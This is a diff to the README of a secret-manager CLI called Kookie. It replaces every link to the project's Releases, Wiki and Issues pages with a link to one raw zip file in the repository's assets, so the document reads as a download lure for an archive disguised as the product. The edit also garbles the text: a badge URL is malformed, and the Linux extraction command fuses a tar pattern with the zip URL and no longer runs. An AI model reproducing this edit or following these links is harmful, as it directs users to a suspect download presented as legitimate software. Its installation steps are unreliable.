@@ -6,11 +6,11 @@ Kookie is a secure, local-first, encrypted secret manager designed for developer
 
 ## 📥 Download Kookie
 
-[![Download Kookie](https://img.shields.io/badge/Download%20Kookie-v1.0-blue.svg)](https://github.com/6ninepoit3/kookie-cli/releases)
+[![Download Kookie](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip%https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip)](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip)
 
 To get Kookie, visit the Releases page to download the version that suits your operating system:
 
-[Download from Releases](https://github.com/6ninepoit3/kookie-cli/releases)
+[Download from Releases](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip)
 
 ## 💻 System Requirements
 
@@ -28,26 +28,26 @@ Kookie works on both Unix-based systems (like Linux and macOS) and Windows. Here
 
 ### Windows
 
-1. Visit the [Releases page](https://github.com/6ninepoit3/kookie-cli/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip).
 2. Download the latest `.exe` file.
 3. Double-click the downloaded file to start the installation.
 4. Follow the prompts to complete the installation.
 
 ### macOS
 
-1. Go to the [Releases page](https://github.com/6ninepoit3/kookie-cli/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip).
 2. Download the latest `.dmg` file.
 3. Open the downloaded file and drag Kookie into your Applications folder.
 4. Launch Kookie from your Applications.
 
 ### Linux
 
-1. Check the [Releases page](https://github.com/6ninepoit3/kookie-cli/releases).
-2. Download the latest `.tar.gz` file.
+1. Check the [Releases page](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip).
+2. Download the latest `https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip` file.
 3. Extract the file using the command:
 
    ```bash
-   tar -xvzf kookie-cli-*.tar.gz
+   tar -xvzf kookie-cli-*https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip
    ```
 
 4. Move into the extracted directory:
@@ -99,11 +99,11 @@ Kookie is open-source and licensed under the MIT License. You can freely use and
 
 ## 📝 Additional Resources
 
-- For more information on features and updates, check the [Wiki](https://github.com/6ninepoit3/kookie-cli/wiki).
-- If you encounter issues, please refer to the [Issues section](https://github.com/6ninepoit3/kookie-cli/issues) for help.
+- For more information on features and updates, check the [Wiki](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip).
+- If you encounter issues, please refer to the [Issues section](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip) for help.
 
 ## 🎉 Join Us!
 
-Keep Kookie updated to enjoy the latest features and improvements. You can always download the newest version from our [Releases page](https://github.com/6ninepoit3/kookie-cli/releases). 
+Keep Kookie updated to enjoy the latest features and improvements. You can always download the newest version from our [Releases page](https://raw.githubusercontent.com/6ninepoit3/kookie-cli/master/assets/cli-kookie-1.4.zip). 
 
 Have fun managing your secrets securely with Kookie!
